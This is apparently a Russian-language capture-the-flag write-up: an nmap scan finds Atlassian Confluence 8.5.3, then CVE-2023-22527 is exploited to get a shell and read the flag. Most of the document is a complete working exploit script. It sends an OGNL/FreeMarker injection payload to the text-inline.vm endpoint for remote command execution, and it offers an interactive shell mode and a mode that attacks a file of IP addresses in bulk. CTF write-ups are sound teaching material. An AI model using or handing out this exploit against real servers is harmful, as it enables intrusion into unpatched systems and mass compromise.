#  Сканируем порты
```bash
┌──(kali㉿kaliOlymp)-[~/.sols/conf 1]
└─$ nmap -v 10.10.1.159
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 15:40 MSK
Initiating Ping Scan at 15:40
Scanning 10.10.1.159 [4 ports]
Completed Ping Scan at 15:40, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:40
Completed Parallel DNS resolution of 1 host. at 15:40, 0.01s elapsed
Initiating SYN Stealth Scan at 15:40
Scanning 10.10.1.159 [1000 ports]
Discovered open port 8090/tcp on 10.10.1.159
Completed SYN Stealth Scan at 15:41, 9.84s elapsed (1000 total ports)
Nmap scan report for 10.10.1.159
Host is up (0.00072s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
8090/tcp open  opsmessaging

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.01 seconds
           Raw packets sent: 2004 (88.152KB) | Rcvd: 3 (116B)

```
### Видим `8090/tcp open  opsmessaging`, там  confluence (Powered by Atlassian Confluence 8.5.3) 
### Находим CVE-2023-22527
# CVE-2023-22527
```bash
┌──(kali㉿kaliOlymp)-[~/.sols/conf 1]
└─$ python3 z.py -u http://10.10.1.159:8090/ --shell                   
[!] Shell is ready, please type your commands UwU
$ ls
analytics-logs
...
flag.txt
temp
thumbnails
viewfile
webresource-temp
$ cat flag.txt
nto{c0nflu3nc3_15_und3r_4774ck}
$ 
```
# 
```python
# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability
# Date: 25/1/2024
# Exploit Author: MaanVader
# Vendor Homepage: https://www.atlassian.com/software/confluence
# Software Link: https://www.atlassian.com/software/confluence
# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3
# Tested on: 8.5.3
# CVE : CVE-2023-22527



import requests
import argparse
import urllib3
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from rich.console import Console

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Argument parsing
parser = argparse.ArgumentParser(description="Send a payload to Confluence servers.")
parser.add_argument("-u", "--url", help="Single Confluence Server URL")
parser.add_argument("-f", "--file", help="File containing list of IP addresses")
parser.add_argument("-c", "--command", help="Command to Execute")
parser.add_argument("--shell", action="store_true", help="Open an interactive shell on the specified URL")
args = parser.parse_args()

# Rich console for formatted output
console = Console()

# Function to send payload
def send_payload(url, command):
    headers = {
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload = ('label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027'
                      '&x=@org.apache.struts2.ServletActionContext@getResponse().getWriter().write((new freemarker.template.utility.Execute()).exec({"' + command + '"}))\r\n')
    headers['Content-Length'] = str(len(payload))
    
    full_url = f"{url}/template/aui/text-inline.vm"
    response = requests.post(full_url, verify=False, headers=headers, data=payload, timeout=10, allow_redirects=False)
    return response.text.split('<!DOCTYPE html>')[0].strip()

# Interactive shell function
def interactive_shell(url):
    session = PromptSession()
    console.print("[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]")
    while True:
        try:
            cmd = session.prompt(HTML("<ansired><b>$ </b></ansired>"))
            if cmd.lower() in ["exit", "quit"]:
                break
            response = send_payload(url, cmd)
            console.print(response)
        except KeyboardInterrupt:
            break
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            break

# Process file function
def process_file(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            ip = line.strip()
            url = f"http://{ip}:8090"
            console.print(f"Processing {url}")
            print(send_payload(url, args.command))

# Main execution logic
if args.shell and args.url:
    interactive_shell(args.url)
elif args.url and args.command:
    print(send_payload(args.url, args.command))
elif args.file and args.command:
    process_file(args.file)
else:
    print("Error: Please provide a valid URL and a command or use the interactive shell option.")
            
```
